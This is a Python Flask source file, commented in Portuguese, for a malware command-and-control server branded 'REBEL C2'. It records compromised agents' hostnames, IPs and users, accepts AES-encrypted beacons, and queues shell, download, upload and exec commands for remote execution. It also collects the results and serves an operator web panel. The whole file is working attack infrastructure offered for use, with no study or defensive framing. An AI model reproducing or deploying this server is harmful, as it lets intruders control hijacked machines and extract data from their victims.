import sqlite3
import secrets
import json
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Chave de criptografia global (gerada uma vez, salva em variável de ambiente ou arquivo seguro)
SECRET_KEY = secrets.token_bytes(32)  # AES-256

def encrypt(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return json.dumps({'iv': iv, 'ciphertext': ct})

def decrypt(enc_data):
    b64 = json.loads(enc_data)
    iv = base64.b64decode(b64['iv'])
    ct = base64.b64decode(b64['ciphertext'])
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

# Inicializar banco de dados
def init_db():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        ip TEXT,
        os TEXT,
        user TEXT,
        first_seen REAL,
        last_seen REAL,
        status TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        command TEXT,
        args TEXT,
        status TEXT,
        result TEXT,
        timestamp REAL
    )''')
    conn.commit()
    conn.close()

init_db()

# Interface Web Simples para Operador
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head><title>REBEL C2 PANEL</title></head>
<body>
<h1>[!] REBEL C2 — Painel de Controle</h1>
<h3>Agentes Ativos:</h3>
<ul>
{% for agent in agents %}
<li>[{{agent.id}}] {{agent.hostname}} @ {{agent.ip}} ({{agent.os}}) — Último contato: {{agent.last_seen}}</li>
{% endfor %}
</ul>
<hr>
<h3>Enviar Comando:</h3>
<form method="POST" action="/task">
    <input type="text" name="agent_id" placeholder="ID do Agente" required><br><br>
    <input type="text" name="command" placeholder="Comando (ex: shell, download, upload, exec)" required><br><br>
    <textarea name="args" placeholder="Argumentos (JSON)"></textarea><br><br>
    <input type="submit" value="ENVIAR COMANDO REBELDE">
</form>
</body>
</html>
'''

@app.route('/')
def panel():
    conn = sqlite3.connect('c2.db')
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM agents WHERE status = 'alive'")
    agents = c.fetchall()
    conn.close()
    return render_template_string(HTML_TEMPLATE, agents=agents)

@app.route('/beacon', methods=['POST'])
def beacon():
    try:
        encrypted_data = request.json.get('data')
        decrypted = decrypt(encrypted_data)
        data = json.loads(decrypted)

        agent_id = data.get('id')
        hostname = data.get('hostname')
        ip = request.remote_addr
        os_info = data.get('os')
        user = data.get('user')

        conn = sqlite3.connect('c2.db')
        c = conn.cursor()

        c.execute("SELECT * FROM agents WHERE id = ?", (agent_id,))
        if c.fetchone():
            c.execute("UPDATE agents SET last_seen = ?, ip = ?, status = 'alive' WHERE id = ?", (time.time(), ip, agent_id))
        else:
            c.execute("INSERT INTO agents (id, hostname, ip, os, user, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'alive')",
                      (agent_id, hostname, ip, os_info, user, time.time(), time.time()))

        # Buscar tarefas pendentes para este agente
        c.execute("SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pending'", (agent_id,))
        tasks = [{'task_id': row[0], 'command': row[1], 'args': row[2]} for row in c.fetchall()]

        # Marcar como "delivered"
        for task in tasks:
            c.execute("UPDATE tasks SET status = 'delivered' WHERE id = ?", (task['task_id'],))

        conn.commit()
        conn.close()

        response = {'tasks': tasks}
        encrypted_response = encrypt(json.dumps(response))
        return jsonify({'data': encrypted_response})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/task', methods=['POST'])
def create_task():
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    args = request.form.get('args', '{}')

    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT INTO tasks (agent_id, command, args, status, timestamp) VALUES (?, ?, ?, 'pending', ?)",
              (agent_id, command, args, time.time()))
    conn.commit()
    conn.close()

    return f"[!] Comando [{command}] enfileirado para agente {agent_id} — ID da tarefa: {c.lastrowid}"

@app.route('/result', methods=['POST'])
def result():
    encrypted_data = request.json.get('data')
    decrypted = decrypt(encrypted_data)
    data = json.loads(decrypted)

    task_id = data.get('task_id')
    result_data = data.get('result')

    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("UPDATE tasks SET status = 'completed', result = ? WHERE id = ?", (result_data, task_id))
    conn.commit()
    conn.close()

    return jsonify({'status': 'received'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'), debug=False)
